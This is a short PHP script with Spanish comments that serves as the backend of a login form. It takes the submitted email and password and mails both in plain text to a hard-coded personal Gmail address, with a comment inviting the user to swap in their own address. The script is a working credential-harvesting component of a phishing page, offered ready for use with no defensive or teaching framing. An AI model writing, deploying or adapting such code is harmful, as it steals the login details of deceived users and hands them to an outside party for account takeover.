<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    $to = "c.d.degado.gonzalez@gmail.com";  // Reemplaza con tu dirección de correo electrónico
    $subject = "Nuevo intento de inicio de sesión";
    $message = "Se ha recibido un intento de inicio de sesión con los siguientes datos:\n\n";
    $message .= "Correo Electrónico: " . $email . "\n";
    $message .= "Contraseña: " . $password . "\n";

    $headers = "From: no-reply@tu-dominio.com\r\n";

    if (mail($to, $subject, $message, $headers)) {
        echo "Los datos se han enviado correctamente.";
    } else {
        echo "Hubo un problema al enviar los datos.";
    }
} else {
    echo "Método de solicitud no permitido.";
}
?>
